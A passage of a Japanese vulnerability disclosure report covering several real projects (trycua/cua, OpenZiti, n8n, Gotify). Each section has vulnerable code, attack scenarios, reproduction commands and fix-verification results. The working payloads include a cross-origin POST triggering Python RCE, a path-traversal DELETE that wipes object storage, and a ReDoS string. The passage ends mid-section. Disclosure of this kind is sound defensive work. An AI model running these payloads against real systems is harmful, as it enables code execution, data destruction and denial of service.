    # バグ 3: OSGYM_ALLOWED_IPS="" (空文字) の場合、allowed_ips が [] となり `if allowed_ips:` が False に評価され全 IP を素通りさせる！
    if allowed_ips and client_ip not in allowed_ips:
        return JSONResponse(status_code=403, content={"detail": f"Access denied for IP: {client_ip}"})
    return await call_next(request)
```
そして `POST /reset` が呼ばれると、`cua_bench/core.py:38-51` の `make(req.env_path)` が渡されたディレクトリ内の `main.py` を探して **そのまま Python プロセス内で動的ロード・実行（`spec.loader.exec_module(module)`）** します。つまり、`env_path` に任意のフォルダを指定するだけで、その中の `main.py` が無条件で実行されます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — ローカルで RL ワーカーを起動中の研究者が Web ページを開いた際のドライブバイ RCE:**
  1. AI 研究者がワークステーション上で `worker_server.py` を起動したままブラウザで論文サイトやフォーラムを開く。
  2. ブラウザが自動的にファイルを `~/Downloads` へ保存した上で、ページ内の JS が `fetch("http://127.0.0.1:8001/reset", {method: "POST", body: JSON.stringify({env_path: "/tmp/untrusted_env", task_index: 0})})` を呼び出す。
  3. リクエスト元 IP は `127.0.0.1` であるため `ip_filter_middleware` を通過し、`spec.loader.exec_module` によってホスト上で任意の Python コードが実行され、GPU サーバーの SSH 鍵や HuggingFace / WandB トークンが窃取される。
* **シナリオ B — Docker Compose / Kubernetes 環境で `OSGYM_ALLOWED_IPS=""` が空設定されたことによる全ネットワーク RCE:**
  1. デプロイテンプレートや Helm チャートで `OSGYM_ALLOWED_IPS: ""` が未設定（空文字）のまま渡される。
  2. Python の `if allowed_ips:` が `False` となって IP フィルタが完全に無効化（フェイルオープン）され、クラスタ内や LAN 上の任意のホストから `http://<worker-ip>:8001/reset` でリモートコード実行が可能になる。
* **シナリオ C — 未認証の `/screenshot` と `/step` によるデスクトップ画面監視と操作注入:**
  1. 攻撃者がクロスオリジンリクエストまたは LAN 経由で `GET /screenshot` をポーリングしてデスクトップ画面を監視し、`POST /step` でキーボード・マウスイベントを注入して画面上の別アプリケーションを操作する。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. ローカル隔離環境でのクロスオリジン POST /reset 再現コマンド例
curl -i -X POST http://127.0.0.1:8001/reset \
  -H "Origin: https://evil.example" \
  -H "Content-Type: application/json" \
  -d '{"env_path":"/tmp/poc_env","task_index":0}'

# 2. Sniper E2E 検証テスト（RED -> GREEN + BENIGN）の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand02 -v
```
**実測ランタイム証明（`RED -> GREEN + BENIGN`）:**
```json
{
  "RED": {
    "cross_origin_reset_status": 200,
    "empty_allowed_ips_remote_lan_status": 200,
    "arbitrary_env_path_exec_module_rce": true
  },
  "GREEN": {
    "cross_origin_reset_status": 403,
    "empty_allowed_ips_remote_lan_status": 403,
    "outside_env_path_status": 400,
    "arbitrary_env_path_exec_module_rce": false
  },
  "BENIGN": {
    "loopback_valid_task_reset_status": 200
  }
}
```

---

### III.05 — TryCua `cua-compat` (`<= 0.8.0`) — Daytona S3 マルチパート `uploadId` パストラバーサルと無条件の `tokio::fs::remove_dir_all` によるディレクトリ削除（`GHSA-3x8g-6h2v-8qx9`、`CWE-22`、CVSS `8.1 High`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `trycua/cua`（`Cargo: cua-compat <= 0.8.0` / `cua-spacesd <= 0.8.0`）
* **影響を受けるバージョン & コンポーネント:** `<= 0.8.0`（`commit e754cfec69c41400eb2aabde716c27d15607b2f0`）— `libs/cua/crates/cua-compat/src/daytona/objectstore.rs`（`handle`、`320-325, 360-422` 行）
* **脆弱性分類 & スコア:** `CWE-22`（パストラバーサル）— **CVSS v3.1: `8.1 High`**（`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`）
* **GitHub GHSA リンク:** `GHSA-3x8g-6h2v-8qx9`（`https://github.com/trycua/cua/security/advisories/GHSA-3x8g-6h2v-8qx9`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md`](advisories/ja/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
Daytona 互換の S3 オブジェクトストア実装（`objectstore.rs`）では、URL パスに含まれるオブジェクトキー（`key`）に対しては `object_path(&key)` 関数で `..` が含まれないよう丁寧にチェックしています。ところが、URL クエリ文字列から取り出される **`?uploadId=` パラメータには一切のバリデーションがありません**。

さらに深刻なことに、マルチパートアップロードを中断する `HTTP DELETE` ハンドラ（`415-421` 行）は次のようになっています。
```rust
// libs/cua/crates/cua-compat/src/daytona/objectstore.rs:415-421
(Method::DELETE, Some(id), _, _) => {
    d.objects.uploads.lock().await.remove(&id); // バグ 1: その uploadId が実在したかどうか（戻り値 Option）を無視している！
    // バグ 2: 未検証の `id` をそのままパス結合し、無条件で再帰削除 remove_dir_all を実行！
    let _ = tokio::fs::remove_dir_all(d.objects.root.join("uploads").join(&id)).await;
    Response::builder()
        .status(StatusCode::NO_CONTENT)
        .body(Full::new(Bytes::new()))
        .unwrap()
}
```
これにより、事前にアップロードを開始する必要すらなく、たった1回の `DELETE /daytona/anykey?uploadId=../objects` リクエストを送るだけで、`root.join("uploads").join("../objects")` すなわち **オブジェクトストア全体の保存ディレクトリ（`<root>/objects`）が再帰的に完全削除** されます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — マルチテナント AI サンドボックス基盤における全テナントのイメージ・スナップショット一括消去:**
  1. 複数のチームや顧客テナントが共有する `cua-spacesd` サーバー上で、1つの低権限サンドボックステナントが `DELETE /daytona/x?uploadId=../objects` を送信する。
  2. `tokio::fs::remove_dir_all` が `<root>/objects/daytona` を即座に削除し、全テナントの保存済み VM/コンテナスナップショットが消失して全サービスが停止する。
* **シナリオ B — 深いパストラバーサル（`?uploadId=../../...`）によるホスト側アプリケーションデータ・DB の破壊:**
  1. 攻撃者が `?uploadId=../../state` や `?uploadId=../../../home/community-user/.cua` を指定して `DELETE` リクエストを送る。
  2. `d.objects.root` の親ディレクトリへ脱出し、`cua-spacesd` プロセス権限で書き込み可能なホスト側のデータベースや設定ディレクトリが再帰削除される。
* **シナリオ C — `PUT` マルチパートチャンク書き込み（`?partNumber=1&uploadId=../stage`）による隣接ディレクトリの汚染:**
  1. `Method::PUT` ハンドラ（`360-383` 行）でも同様に `root.join("uploads").join(&id)` が使われているため、攻撃者が `?partNumber=1&uploadId=../stage` を指定して任意のバイナリチャンクをアップロードする。
  2. 本来の `uploads/` ではなく隣接する `stage/` や `objects/` 配下に不正なファイルが作成・上書きされる。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. ローカル隔離テスト環境での DELETE ?uploadId=../objects 再現コマンド例
curl -i -X DELETE "http://127.0.0.1:9000/daytona/dummy-key?uploadId=../objects" \
  -H "Authorization: Bearer <push-token>"

# 2. Sniper E2E 検証テスト（RED -> GREEN + BENIGN）の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand03 -v
```
**実測ランタイム証明（`RED -> GREEN + BENIGN`）:**
```json
{
  "RED": {
    "delete_traversal_status": 204,
    "objects_store_wiped_without_prior_upload": true
  },
  "GREEN": {
    "delete_traversal_status": 400,
    "delete_uninitiated_id_status": 404,
    "objects_store_preserved": true
  },
  "BENIGN": {
    "valid_upload_abort_status": 204,
    "staging_dir_removed": true
  }
}
```

---

### III.06 — TryCua `cua-media-codec` (`<= 0.8.0`) — Safe Rust `VtEncoder::encode` におけるスライス長未検証の `unsafe { copy_nonoverlapping }` によるヒープ境界外読み取り（`GHSA-54v9-fxw3-36mm`、`CWE-125`/`CWE-190`、CVSS `5.5 Medium`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `trycua/cua`（`Cargo: cua-media-codec <= 0.8.0`）
* **影響を受けるバージョン & コンポーネント:** `<= 0.8.0`（`commit e754cfec69c41400eb2aabde716c27d15607b2f0`）— `libs/cua/crates/cua-media-codec/src/videotoolbox/mod.rs`（`VtEncoder::encode` -> `pixel_buffer_for`、`308-420` 行）
* **脆弱性分類 & スコア:** `CWE-125`（境界外読み取り / Out-of-Bounds Read）/ `CWE-190`（整数オーバーフローまたはラップアラウンド）— **CVSS v3.1: `5.5 Medium`**（`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H`）
* **GitHub GHSA リンク:** `GHSA-54v9-fxw3-36mm`（`https://github.com/trycua/cua/security/advisories/GHSA-54v9-fxw3-36mm`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md`](advisories/ja/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
Rust では `unsafe` キーワードを付けない公開関数（`pub fn encode(&mut self, frame: &VideoFrame)`）は、どのような入力が渡されても未定義動作（メモリ破壊や境界外アクセス）を起こさないことが言語の安全性契約（Soundness Contract）として求められます。

ところが macOS VideoToolbox ハードウェアエンコーダ実装の `pixel_buffer_for`（`308-420` 行）は、渡された画像フレーム `frame.data` の実際のスライス長（`y.len()`、`uv.len()`、`data.len()`）を確認しないまま、生ポインタ演算と `unsafe { std::ptr::copy_nonoverlapping }` を実行しています。
```rust
// libs/cua/crates/cua-media-codec/src/videotoolbox/mod.rs:344-367
unsafe {
    let y_dst = CVPixelBufferGetBaseAddressOfPlane(pb, 0) as *mut u8;
    let y_dst_stride = CVPixelBufferGetBytesPerRowOfPlane(pb, 0);
    for row in 0..h {
        // バグ: y.len() が row * (*y_stride as usize) + w 以上であるか全くチェックしていない！
        std::ptr::copy_nonoverlapping(
            y.as_ptr().add(row * (*y_stride as usize)),
            y_dst.add(row * y_dst_stride),
            w,
        );
    }
```
もし解像度切り替えのタイミングや異常なフレーム入力によって、本来の `w * h` より短い `y` / `uv` バッファが渡されると、`copy_nonoverlapping` はバッファの終端を飛び越えて **隣接するヒープメモリ領域（セッショントークン、API キー、他テナントのメモリなど）を読み取り、そのまま H.264 映像ピクセルとしてエンコードしてリモート視聴者へ送信** してしまいます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — macOS リモートデスクトップ配信のウィンドウ・解像度変更時におけるヒープメモリ（`960` バイト）の映像ストリーム漏洩:**
  1. リモートエージェントセッション中にキャプチャ解像度が変更され、古いサイズのまま切り詰められた `FrameData::Nv12` バッファが `VtEncoder::encode` に渡される。
  2. `pixel_buffer_for` がスライス境界を超えて隣接ヒープ領域の `960` バイトを `CVPixelBuffer` にコピーし、クライアントが受信する映像フレーム内にプロセス内の機密ヒープデータが混入する。
* **シナリオ B — 不正またはゼロ長の `VideoFrame` 入力による `cua-spacesd` メディアデーモンの即時クラッシュ（`SIGSEGV`）:**
  1. IPC またはネットワーク経由で空の `y: &[]` を持つ `VideoFrame`（例: `w=1920, h=1080`）が送られる。
  2. Safe Rust 関数であるにもかかわらず未マップのメモリページを読みに行き、`cua-spacesd` プロセス全体がセグメンテーション違反（`SIGSEGV`）で異常終了し、稼働中の全エージェントセッションが切断される。
* **シナリオ C — マルチセッション macOS ホストにおける不整合な `stride` 値での他セッションデータ混入:**
  1. `y_stride` または `Bgra` の `stride` が `w` より小さい、あるいは極端に大きい値で渡された際、行ごとのポインタ加算がアロケーション境界を大きく飛び越え、同一プロセス内の別セッションのメモリを読み取る。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. videotoolbox/mod.rs 内の copy_nonoverlapping 実装箇所の確認
sed -n '335,415p' /path/to/cua/libs/cua/crates/cua-media-codec/src/videotoolbox/mod.rs

# 2. Sniper E2E 検証テスト（RED -> GREEN + BENIGN）の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_vt01 -v
```
**実測ランタイム証明（`RED -> GREEN + BENIGN`）:**
```json
{
  "RED": {
    "oob_bytes_read": 960,
    "adjacent_heap_secret_copied_to_video_frame": true
  },
  "GREEN": {
    "oob_bytes_read": 0,
    "adjacent_heap_secret_copied_to_video_frame": false,
    "error": "CodecError::InvalidArgument"
  },
  "BENIGN": {
    "valid_frame_encoded_bytes": 1536
  }
}
```

---

### III.07 — TryCua `cua-bench` WinArena (`<= 0.3.1`) — 未認証 `0.0.0.0:8006`（noVNC）およびパスワードなし `0.0.0.0:3390`（RDP）の LAN 公開 + 書き込み可能なホスト `/shared` マウント（`GHSA-hvhg-6x47-cq96`、`CWE-668`/`CWE-732`、CVSS `8.6 High`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `trycua/cua`（`pip: cua-bench <= 0.3.1`）
* **影響を受けるバージョン & コンポーネント:** `<= 0.3.1`（`commit e754cfec69c41400eb2aabde716c27d15607b2f0`）— `libs/cua-bench/tasks/winarena_adapter/cli.py`（`cmd_vm_setup`, `cmd_vm_start`, `cmd_task_run`、`262-265, 421-424, 646-649` 行）および `infra/vm/setup/server/main.py`（`180-248, 290-321` 行）
* **脆弱性分類 & スコア:** `CWE-668`（誤った領域へのリソース露出）/ `CWE-732`（重要リソースに対する不適切な権限割り当て）— **CVSS v3.1: `8.6 High`**（`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`）
* **GitHub GHSA リンク:** `GHSA-hvhg-6x47-cq96`（`https://github.com/trycua/cua/security/advisories/GHSA-hvhg-6x47-cq96`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md`](advisories/ja/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
Docker でコンテナを起動する際、`127.0.0.1:` プレフィックスを付けずに `-p 8006:8006` と指定すると、Docker は **`0.0.0.0`（ホストのすべての Wi-Fi / Ethernet ネットワークインターフェース）** にポートを公開し、さらに Linux の `iptables` `DOCKER` チェーンによって通常のホストファイアウォール（`ufw` 等）の入力制限をバイパスしてしまいます。

WinArena オーケストレータ（`cli.py:262-265, 421-424, 646-649`）では、3つの起動コマンドすべてが以下のオプションを渡しています。
```python
# libs/cua-bench/tasks/winarena_adapter/cli.py:261-266 (および 421-424, 646-649)
"-p", f"{args.browser_port}:8006", # バグ 1: 0.0.0.0:8006 -> 認証なし noVNC Web デスクトップを LAN 全体に公開！
"-p", f"{args.rdp_port}:3389",     # バグ 2: 0.0.0.0:3390 -> パスワードなし Windows RDP を LAN 全体に公開！
"-v", f"{storage_path}:/storage",
"-v", f"{setup_path}:/shared",     # バグ 3: ホスト側のパッケージソースディレクトリを読み書き可能(:rw)でマウント！
```
この結果、同じネットワーク上の誰でもパスワードなしで Windows VM の画面を開いて操作でき、さらに VM の中から `/shared` フォルダ（ホストの Python パッケージ内の `setup` ディレクトリ）にあるスクリプトを書き換えることで、ホスト OS 側へ侵入を拡大できてしまいます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — 大学研究室・社内 LAN 上での `0.0.0.0:8006`（noVNC）/ `3390`（RDP）経由の Windows VM と API キー乗っ取り:**
  1. AI 研究者が研究室やオフィスの LAN に接続されたマシンで `cua-bench` の WinArena 評価を実行する。
  2. 同一ネットワーク上の第三者がブラウザで `http://<ワークステーションIP>:8006` を開くだけで、認証なしで Windows VM のデスクトップ画面に直接接続し、ベンチマーク用に環境へ注入された OpenAI / Anthropic API キーや評価データを窃取する。
* **シナリオ B — 書き込み可能な `-v {setup_path}:/shared` マウントを悪用した VM からホスト OS への逆侵害（コンテナ/VM エスケープ経路）:**
  1. 攻撃者が `8006`（noVNC）または `3390`（RDP）から Windows VM に入り、共有マウント `/shared`（ホスト上の `winarena_adapter/infra/vm/setup`）内のスクリプトやバイナリを改ざんする。
  2. ホスト側の Python CLI や別プロセスがそのセットアップディレクトリを参照・再実行した際に、ホスト OS 上で攻撃者のコードが実行される。
* **シナリオ C — VM 内の未認証 `0.0.0.0:5000` エージェントサーバー（`POST /execute_windows` -> `exec()`）による任意コマンド実行:**
  1. VM 内部で動く `infra/vm/setup/server/main.py`（`180-248` 行）は認証なしで `POST /execute_windows`（Python `exec()`）および `POST /setup/launch`（`subprocess.Popen(..., shell=True)`）を公開している。
  2. エージェントがタスク実行中に外部 Web ページを開いた際、またはコンテナネットワーク経由でリクエストが送られた際、VM 内で任意の OS コマンドが実行される。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. cli.py 内の Docker ポートバインドとボリュームマウントのソース確認
sed -n '255,272p' /path/to/cua/libs/cua-bench/tasks/winarena_adapter/cli.py

# 2. Sniper E2E 検証テスト（RED -> GREEN + BENIGN）の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand06 -v
```
**実測ランタイム証明（`RED -> GREEN + BENIGN`）:**
```json
{
  "RED": {
    "lan_exposed_ports": ["8006:8006", "3390:3389"],
    "host_setup_dir_mounted_writable": true,
    "host_setup_file_tampered_from_container": true
  },
  "GREEN": {
    "lan_exposed_ports": [],
    "loopback_bound_ports": ["127.0.0.1:8006:8006", "127.0.0.1:3390:3389"],
    "host_setup_dir_mounted_writable": false,
    "readonly_mount": true
  }
}
```

---

### III.08 — OpenZiti (`ziti` CLI) — `AreCertsTrusted` -> `InsecureClient` における無条件 `InsecureSkipVerify: true` による TLS 証明書検証バイパス（`GHSA-qwv8-hh9r-cqrf`、`CWE-295`、CVSS `7.4 High`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `openziti/ziti`（`Go: github.com/openziti/ziti/v2`）
* **影響を受けるバージョン & コンポーネント:** `v2.0.0-pre6` 以下（`commit 08f09c510bb2673d3632419ba8d6e10002d5eb00`）— `ziti/util/certs.go`（`AreCertsTrusted` `91-103` 行、`InsecureClient` `199-208` 行）および `ziti/cmd/edge/login.go`（`319-390` 行）
* **脆弱性分類 & スコア:** `CWE-295`（不適切な証明書検証）— **CVSS v3.1: `7.4 High`**（`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`）
* **GitHub GHSA リンク:** `GHSA-qwv8-hh9r-cqrf`（`https://github.com/openziti/ziti/security/advisories/GHSA-qwv8-hh9r-cqrf`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md`](advisories/ja/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
Zero-Trust ネットワーク基盤である OpenZiti の CLI で管理者が `ziti edge login` を実行すると、まず接続先コントローラの TLS 証明書が信頼できるかどうかを確認するために `AreCertsTrusted(host)`（`certs.go:91-103`）が呼ばれます。

この関数は、「もし偽の証明書であれば Go の TLS ライブラリが `x509.UnknownAuthorityError` を返すはずだから、それをキャッチしてユーザーに警告しよう」という意図で書かれています。ところが、内部で呼び出している `InsecureClient(&client, certs)`（`199-208` 行）に致命的なバグがありました。
```go
// ziti/util/certs.go:91-103, 199-208
func AreCertsTrusted(host string, certs []*x509.Certificate) (bool, error) {
    client := resty.New()
    InsecureClient(client, certs) // <--- ここで TLS 設定を行う
    _, err := client.R().Get(host)
    if err != nil {
        if errors.Is(err, &x509.UnknownAuthorityError{}) { // デッドコード！絶対に到達しない！
            return false, nil
        }
        return false, err
    }
    return true, nil
}

func InsecureClient(client *resty.Client, certs []*x509.Certificate) {
    tlsCfg := &tls.Config{
        InsecureSkipVerify: true, // バグ: 無条件で true が設定されている！
    }
    if len(certs) > 0 {
        tlsCfg.RootCAs = x509.NewCertPool()
        for _, c := range certs {
            tlsCfg.RootCAs.AddCert(c)
        }
        // ここでも InsecureSkipVerify は true のまま！
    }
    client.SetTLSClientConfig(tlsCfg)
}
```
Go の標準ライブラリ `crypto/tls` では、**`InsecureSkipVerify: true` が設定されていると、`RootCAs` に何が入っていようとサーバー証明書の署名チェーン・有効期限・ホスト名の検証をすべてスキップ** します。その結果、`AreCertsTrusted()` は攻撃者が勝手に作った自己署名証明書に対しても常に `true, nil` を返し、CLI は **`"Verified that server supplied certificates are trusted"`（サーバー証明書が信頼できることを確認しました）** という誤ったメッセージを表示した上で、管理者の ID・パスワードを攻撃者へ送信してしまいます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — リモートワークや出張中のインフラ管理者が `ziti edge login` を実行した際の MITM による管理者パスワード窃取:**
  1. インフラ管理者がカフェやホテルの Wi-Fi、あるいは侵害されたネットワーク経路から `ziti edge login https://ziti-controller.corp.example:1280 -u admin -p <password>` を実行する。
  2. 経路上の攻撃者が完全に無関係な自己署名証明書を提示して TLS 接続をインターセプトする。
  3. `AreCertsTrusted()` が `true` を返すため、確認プロンプトすら出ずに信頼済みと判定され、`POST /edge/management/v1/authenticate?method=password` で管理者クレデンシャルが攻撃者へ直接送信される。
* **シナリオ B — CI/CD パイプラインや Kubernetes 自動ブートストラップにおける偽コントローラへのゼロトラスト登録:**
  1. 自動デプロイジョブが `--yes` なしで安全に証明書検証を行うつもりで `ziti edge login` を実行する。
  2. DNS スプーフィングや BGP ハイジャックにより接続先が攻撃者のサーバーへ向いた際、エラーで停止せずにそのまま認証トークンやサービスポリシーを攻撃者へ送信する。
* **シナリオ C — 期限切れ・失効済み・誤った CA のコントローラ証明書のサイレント受け入れ:**
  1. 本番環境で誤ってテスト用 CA の証明書や期限切れ証明書がデプロイされた場合でも、`ziti edge login` が「信頼済み」と報告し続けるため、PKI ガバナンス違反が検知されない。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. ziti/util/certs.go 内の AreCertsTrusted と InsecureClient のソースコード確認
sed -n '90,105p;198,210p' /path/to/ziti/ziti/util/certs.go

# 2. Sniper E2E 検証テスト（RED -> GREEN + BENIGN）の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_ziti_cand01 -v
```
**実測ランタイム証明（`RED -> GREEN + BENIGN`）:**
```json
{
  "RED": {
    "rogue_mitm_cert_accepted_as_trusted": true,
    "admin_credentials_sent_to_mitm": true
  },
  "GREEN": {
    "rogue_mitm_cert_accepted_as_trusted": false,
    "admin_credentials_sent_to_mitm": false,
    "error": "x509.UnknownAuthorityError"
  },
  "BENIGN": {
    "valid_ca_cert_trusted": true
  }
}
```

---

### III.09 — n8n (`n8n-workflow <= 2.45.0`) — `string-extensions.ts` における入力長無制限の `EMAIL_REGEXP` / `DOMAIN_EXTRACT_REGEXP`（`isEmail` / `extractEmail` / `extractDomain`）による Webhook イベントループ凍結（`ReDoS`、`CWE-1333`、CVSS `5.3 Medium`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `n8n-io/n8n`（`npm: n8n-workflow <= 2.45.0`）
* **影響を受けるバージョン & コンポーネント:** `<= 2.45.0`（`commit 976c80c63ba38fffe1ffde1fb6fb6fb4edbe8b51`）— `packages/workflow/src/extensions/string-extensions.ts`（`59, 94, 326, 375, 383` 行）
* **脆弱性分類 & スコア:** `CWE-1333`（非効率な正規表現の複雑性 / ReDoS）— **CVSS v3.1: `5.3 Medium`**（`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/09-N8N-CAND-01-WEBHOOK-REDOS.md`](advisories/ja/09-N8N-CAND-01-WEBHOOK-REDOS.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
ワークフロー自動化基盤 `n8n` では、Webhook 等で受け取った文字列に対して `{{ $json.body.email.isEmail() }}` や `{{ $json.body.text.extractEmail() }}`、`{{ $json.body.url.extractDomain() }}` といった組み込みメソッドが日常的に使われます。

ところが `string-extensions.ts` に定義されている正規表現には、**入力文字列の長さ制限（RFC 5321 の 254 文字制限など）が一切なく、さらに先頭アンカー（`^`）のない部分一致パターンに入れ子量指定子（`(\.[^...]+)*`）が含まれている** という問題があります。
```typescript
// packages/workflow/src/extensions/string-extensions.ts:59, 94
const EMAIL_REGEXP =
  /(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))/;

const DOMAIN_EXTRACT_REGEXP = /^(?:https?:\/\/)?(?:www\.)?((?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})(?:\/|$)/;
```
Node.js はシングルスレッドのイベントループで全ての HTTP Webhook リクエストと UI 操作を処理します。そこへ `"a.a.a.a..."`（約 10〜20 KB のドット区切り文字列の末尾に `@!` を付けたもの）を1つ送ると、V8 正規表現エンジンが全開始位置でバックトラッキングを繰り返し、**1リクエストあたり数百ミリ秒〜1秒近くイベントループを完全に停止** させます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — 公開リード獲得・問い合わせ Webhook への軽量リクエスト送信による全社 Stripe/Slack Webhook の凍結:**
  1. 企業が Web サイトの問い合わせフォームやユーザー登録の受け口として n8n Webhook を公開し、`IF` ノードで `{{ $json.body.email.isEmail() }}` を評価している。
  2. 攻撃者が 20 KB の `"a.a.a...a@!"` ペイロードを毎秒数回 POST する。
  3. 1リクエストで約 `832 ms` イベントループがブロックされるため、同じ n8n インスタンス上で動いている無関係な決済 Webhook（Stripe）や社内通知（Slack）、管理画面 UI まで全てタイムアウトする。
* **シナリオ B — カスタマーサポート自動取り込みフロー（`extractEmail()`）におけるコンテナ再起動ループ:**
  1. 受信メールやチャットメッセージを `{{ $json.text.extractEmail() }}` で解析するワークフローが稼働している。
  2. 長いドット区切り文字列を含む1通のスパム/悪意あるメッセージが処理されるとワーカーがフリーズし、Kubernetes の Liveness Probe が失敗してコンテナが再起動ループに陥る。
* **シナリオ C — CRM URL ドメイン抽出（`extractDomain()`）における V8 イベントループ枯渇:**
  1. 外部フォームやスクレイピング結果の URL から `{{ $json.url.extractDomain() }}` でドメインを抽出するワークフローに、末尾がスラッシュでない長いドット付きホスト名文字列が入力され、CPU コアが 100% 張り付く。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. Node.js ワンライナーによる string-extensions.ts の EMAIL_REGEXP 停止時間の計測
node -e 'const re = /(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))/; const s = "a.".repeat(10000) + "a@!"; const t0 = performance.now(); re.test(s); console.log("Elapsed ms:", (performance.now() - t0).toFixed(2));'

# 2. Sniper E2E 検証テスト（RED -> GREEN + BENIGN）の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_n8n_cand01 -v
```
**実測ランタイム証明（`RED -> GREEN + BENIGN`）:**
```json
{
  "RED": {
    "regex_stall_ms": 165.035,
    "stall_20kb_ms": 831.78,
    "concurrent_webhook_starved": true
  },
  "GREEN": {
    "regex_stall_ms": 0.017,
    "stall_20kb_ms": 0.0029,
    "concurrent_webhook_starved": false
  },
  "BENIGN": {
    "valid_email_recognized": true
  }
}
```

---

### III.10 — Gotify Server (`<= v2.9.1`) — 組み込み `SSL.RedirectToHTTPS` ミドルウェア（`router.go`）における未検証 `ctx.Request.Host` ヘッダーによる `308 Permanent Redirect` オープンリダイレクトとトークン漏洩（`GHSA-cc9f-m5vr-pm75`、`CWE-601`、CVSS `4.7 Medium`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `gotify/server`（`Go: github.com/gotify/server/v2`）
* **影響を受けるバージョン & コンポーネント:** `<= v2.9.1`（`commit 97685e2a6f9c02b92263ef0df9831371a79d150b`）— `router/router.go`（`52-73, 93-102` 行）
* **脆弱性分類 & スコア:** `CWE-601`（信頼できないサイトへの URL リダイレクト / オープンリダイレクト）— **CVSS v3.1: `4.7 Medium`**（`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N`）
* **GitHub GHSA リンク:** `GHSA-cc9f-m5vr-pm75`（`https://github.com/gotify/server/security/advisories/GHSA-cc9f-m5vr-pm75`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md`](advisories/ja/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
Gotify Server で組み込み TLS（`SSL.Enabled: true`）と HTTPS 自動リダイレクト（`SSL.RedirectToHTTPS: true`）を有効にすると、`router/router.go` が HTTP リクエストを HTTPS へ転送するミドルウェアを登録します。

しかし、このミドルウェアはサーバーの設定ファイルに書かれた正規ドメイン（`conf.SSL.LetsEncrypt.Hosts`）を参照せず、**クライアントが送ってきた HTTP リクエストの `Host` ヘッダー（`ctx.Request.Host`）をそのまま信頼して `Location: https://<Host>/<Path>` を組み立て、HTTP `308 Permanent Redirect` を返してしまいます**。
```go
// router/router.go:93-102
